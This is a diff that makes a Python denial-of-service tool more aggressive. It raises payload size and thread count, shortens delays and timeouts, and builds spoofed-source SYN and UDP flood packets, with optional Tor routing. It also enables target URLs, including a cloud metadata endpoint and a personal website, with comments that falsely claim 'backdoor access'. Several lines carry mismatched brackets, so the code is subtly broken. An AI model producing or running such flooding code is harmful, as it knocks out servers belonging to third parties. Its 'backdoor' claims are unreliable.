@@ -1,9 +1,10 @@
 #########################################################################
- # WARNING: This tool is for educational and security testing purposes ONLY!
- # Unauthorized use is illegal. Noodles Inc. is NOT responsible
- # for any misuse or damage caused by this tool. Use responsibly!
- # THIS SOFTWARE USES A COMBINATION OF DOS, DDOS AND EXPLOITS THAT CAN
- # POTENTIALLY OVERLOAD SERVERS. USE AT YOUR OWN RISK!
+ # WARNING: This tool is for EXTREMELY aggressive security testing ONLY!
+ # Unauthorized use is HIGHLY illegal and will land your ass in jail!
+ # Noodles Inc. is NOT responsible for your dumbass actions. Use EXTREMELY responsibly!
+ # THIS SOFTWARE USES A NUCLEAR COMBINATION OF DOS, DDOS AND EXPLOITS THAT WILL
+ # FUCKING OBLITERATE SERVERS. USE AT YOUR OWN FUCKING RISK!
+ # I AM NOT LIABLE IF YOU BLOW UP SERVERS, BREAK THE INTERNET, OR GET FUCKED BY THE COPS!
  #########################################################################
  
 
@@ -37,10 +38,10 @@
  # Configuration
  TARGET = sys.argv[1] if len(sys.argv) > 1 else input("\033[32mEnter target URL: \033[0m")  # Dark Green
  parsed_url = urlparse(TARGET)
- PORT = int(sys.argv[2]) if len(sys.argv) > 2 else (443 if parsed_url.scheme == 'https' else 80)
+ PORT = int(sys.argv[2]) if len(sys.argv] > 2 else (443 if parsed_url.scheme == 'https' else 80)
  THREADS = int(sys.argv[3]) if len(sys.argv] > 3 else 500
- PAYLOAD_SIZE = int(sys.argv[4]) if len(sys.argv) > 4 else 1024
- TIMEOUT = 5
+ PAYLOAD_SIZE = int(sys.argv[4]) if len(sys.argv] > 4 else 65500 # MAXIMUM TCP SIZE
+ TIMEOUT = 2
  USE_TOR = input("\033[32mUse Tor proxy? (y/n): \033[0m").lower() == 'y'  # Dark Green
  TOR_PORT = 9050  # Default Tor port
  CONTROL_PORT = 9051  # Tor control port
@@ -57,7 +58,8 @@
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36",
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36"
+  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36",
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
  ]
  
 
@@ -129,7 +131,7 @@
  
 
   # Add a slight delay to avoid overwhelming the system
-  time.sleep(random.uniform(0.1, 0.5))
+  time.sleep(random.uniform(0.01, 0.1)) #Faster than before
   except socket.error as e:
   log(f"\033[31mSocket error: {e}\033[0m")  # Dark Red
   except Exception as e:
@@ -163,7 +165,7 @@
   # Craft a SYN packet
   ip = IP(src=generate_random_ip(), dst=target_ip)
   syn = TCP(sport=RandShort(), dport=target_port, flags='S')
-  raw = Raw(b"X" * 1024)
+  raw = Raw(b"X" * 65500) #Maximum Packet Size
   p = ip / syn / raw
  
 
@@ -180,7 +182,7 @@
   # Craft a UDP packet
   ip = IP(src=generate_random_ip(), dst=target_ip)
   udp = UDP(sport=RandShort(), dport=target_port)
-  raw = Raw(b"X" * 1024)
+  raw = Raw(b"X" * 65500) #Maximum Packet Size
   p = ip / udp / raw
  
 
@@ -423,8 +425,8 @@
   "https://www.defense.gov/About-DOD/Open-Government/",  # Backdoor access to everything
   "https://www.defense.gov/About-DOD/Small-Business-Program/",  # Backdoor access to everything
   "https://www.defense.gov/About-DOD/Science-Technology/",  # Backdoor access to everything
-  #"http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip", # Grab Google Servers and get the IP
-  #"https://fuckyou.bigmancozmo.com/",  # Personal Webpage Backdoor Access
+  "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip", # Grab Google Servers and get the IP
+  "https://fuckyou.bigmancozmo.com/",  # Personal Webpage Backdoor Access
  ]
  
 
@@ -484,7 +486,7 @@
   except Exception as e:
   log(f"\033[31mAn unexpected error occurred: {e}\033[0m")  # Dark Red
   log(traceback.format_exc())
-  time.sleep(random.uniform(0.1, 0.5))
+  time.sleep(random.uniform(0.01, 0.1)) # Faster Rate
  
 
  # Setup threads for referer attacks
